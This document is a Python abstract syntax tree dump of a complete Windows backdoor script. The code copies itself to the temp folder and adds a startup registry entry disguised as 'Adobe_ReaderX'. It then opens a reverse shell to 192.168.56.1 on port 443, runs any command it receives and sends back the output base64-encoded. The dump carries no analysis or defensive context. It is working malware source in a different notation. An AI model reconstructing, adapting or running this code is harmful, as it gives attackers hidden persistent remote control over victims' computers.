"Module(body=[Import(names=[alias(name='sys')]), Import(names=[alias(name='base64')]), Import(names=[alias(name='os')]), Import(names=[alias(name='socket'), alias(name='subprocess')]), Import(names=[alias(name='winreg')]), FunctionDef(name='autorun', args=arguments(posonlyargs=[], args=[arg(arg='tempdir'), arg(arg='fileName'), arg(arg='run')], kwonlyargs=[], kw_defaults=[], defaults=[]), body=[Expr(value=Call(func=Attribute(value=Name(id='os', ctx=Load()), attr='system', ctx=Load()), args=[BinOp(left=Constant(value='copy %s %s'), op=Mod(), right=Tuple(elts=[Name(id='fileName', ctx=Load()), Name(id='tempdir', ctx=Load())], ctx=Load()))], keywords=[])), Assign(targets=[Name(id='key', ctx=Store())], value=Call(func=Name(id='OpenKey', ctx=Load()), args=[Name(id='HKEY_LOCAL_MACHINE', ctx=Load()), Name(id='run', ctx=Load())], keywords=[])), Assign(targets=[Name(id='runkey', ctx=Store())], value=List(elts=[], ctx=Load())), Try(body=[Assign(targets=[Name(id='i', ctx=Store())], value=Constant(value=0)), While(test=Constant(value=True), body=[Assign(targets=[Name(id='subkey', ctx=Store())], value=Call(func=Name(id='EnumValue', ctx=Load()), args=[Name(id='key', ctx=Load()), Name(id='i', ctx=Load())], keywords=[])), Expr(value=Call(func=Attribute(value=Name(id='runkey', ctx=Load()), attr='append', ctx=Load()), args=[Subscript(value=Name(id='subkey', ctx=Load()), slice=Constant(value=0), ctx=Load())], keywords=[])), AugAssign(target=Name(id='i', ctx=Store()), op=Add(), value=Constant(value=1))], orelse=[])], handlers=[ExceptHandler(type=Name(id='WindowsError', ctx=Load()), body=[Pass()])], orelse=[], finalbody=[]), If(test=Compare(left=Constant(value='Adobe ReaderX'), ops=[NotIn()], comparators=[Name(id='runkey', ctx=Load())]), body=[Try(body=[Assign(targets=[Name(id='key', ctx=Store())], value=Call(func=Name(id='OpenKey', ctx=Load()), args=[Name(id='HKEY_LOCAL_MACHINE', ctx=Load()), Name(id='run', ctx=Load()), Constant(value=0), Name(id='KEY_ALL_ACCESS', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='SetValueEx', ctx=Load()), args=[Name(id='key', ctx=Load()), Constant(value='Adobe_ReaderX'), Constant(value=0), Name(id='REG_SZ', ctx=Load()), Constant(value='%TEMP%\\\\mw.exe')], keywords=[])), Expr(value=Call(func=Attribute(value=Name(id='key', ctx=Load()), attr='Close', ctx=Load()), args=[], keywords=[]))], handlers=[ExceptHandler(type=Name(id='WindowsError', ctx=Load()), body=[Pass()])], orelse=[], finalbody=[])], orelse=[])], decorator_list=[]), FunctionDef(name='shell', args=arguments(posonlyargs=[], args=[], kwonlyargs=[], kw_defaults=[], defaults=[]), body=[Assign(targets=[Name(id='s', ctx=Store())], value=Call(func=Attribute(value=Name(id='socket', ctx=Load()), attr='socket', ctx=Load()), args=[Attribute(value=Name(id='socket', ctx=Load()), attr='AF_INET', ctx=Load()), Attribute(value=Name(id='socket', ctx=Load()), attr='SOCK_STREAM', ctx=Load())], keywords=[])), Expr(value=Call(func=Attribute(value=Name(id='s', ctx=Load()), attr='connect', ctx=Load()), args=[Tuple(elts=[Constant(value='192.168.56.1'), Call(func=Name(id='int', ctx=Load()), args=[Constant(value=443)], keywords=[])], ctx=Load())], keywords=[])), Expr(value=Call(func=Attribute(value=Name(id='s', ctx=Load()), attr='send', ctx=Load()), args=[Constant(value='[*] Connection Established!')], keywords=[])), While(test=Constant(value=1), body=[Assign(targets=[Name(id='data', ctx=Store())], value=Call(func=Attribute(value=Name(id='s', ctx=Load()), attr='recv', ctx=Load()), args=[Constant(value=1024)], keywords=[])), If(test=Compare(left=Name(id='data', ctx=Load()), ops=[Eq()], comparators=[Constant(value='quit')]), body=[Break()], orelse=[]), Assign(targets=[Name(id='proc', ctx=Store())], value=Call(func=Attribute(value=Name(id='subprocess', ctx=Load()), attr='Popen', ctx=Load()), args=[Name(id='data', ctx=Load())], keywords=[keyword(arg='shell', value=Constant(value=True)), keyword(arg='stdout', value=Attribute(value=Name(id='subprocess', ctx=Load()), attr='PIPE', ctx=Load())), keyword(arg='stderr', value=Attribute(value=Name(id='subprocess', ctx=Load()), attr='PIPE', ctx=Load())), keyword(arg='stdin', value=Attribute(value=Name(id='subprocess', ctx=Load()), attr='PIPE', ctx=Load()))])), Assign(targets=[Name(id='stdout_value', ctx=Store())], value=BinOp(left=Call(func=Attribute(value=Attribute(value=Name(id='proc', ctx=Load()), attr='stdout', ctx=Load()), attr='read', ctx=Load()), args=[], keywords=[]), op=Add(), right=Call(func=Attribute(value=Attribute(value=Name(id='proc', ctx=Load()), attr='stderr', ctx=Load()), attr='read', ctx=Load()), args=[], keywords=[]))), Assign(targets=[Name(id='encoded', ctx=Store())], value=Call(func=Attribute(value=Name(id='base64', ctx=Load()), attr='b64encode', ctx=Load()), args=[Name(id='stdout_value', ctx=Load())], keywords=[])), Expr(value=Call(func=Attribute(value=Name(id='s', ctx=Load()), attr='send', ctx=Load()), args=[Name(id='encoded', ctx=Load())], keywords=[]))], orelse=[]), Expr(value=Call(func=Attribute(value=Name(id='s', ctx=Load()), attr='close', ctx=Load()), args=[], keywords=[]))], decorator_list=[]), FunctionDef(name='main', args=arguments(posonlyargs=[], args=[], kwonlyargs=[], kw_defaults=[], defaults=[]), body=[Assign(targets=[Name(id='tempdir', ctx=Store())], value=Constant(value='%TEMP%')), Assign(targets=[Name(id='fileName', ctx=Store())], value=Subscript(value=Attribute(value=Name(id='sys', ctx=Load()), attr='argv', ctx=Load()), slice=Constant(value=0), ctx=Load())), Assign(targets=[Name(id='run', ctx=Store())], value=Constant(value='Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run')), Expr(value=Call(func=Name(id='autorun', ctx=Load()), args=[Name(id='tempdir', ctx=Load()), Name(id='fileName', ctx=Load()), Name(id='run', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='shell', ctx=Load()), args=[], keywords=[]))], decorator_list=[]), If(test=Compare(left=Name(id='__name__', ctx=Load()), ops=[Eq()], comparators=[Constant(value='__main__')]), body=[Expr(value=Call(func=Name(id='main', ctx=Load()), args=[], keywords=[]))], orelse=[])], type_ignores=[])"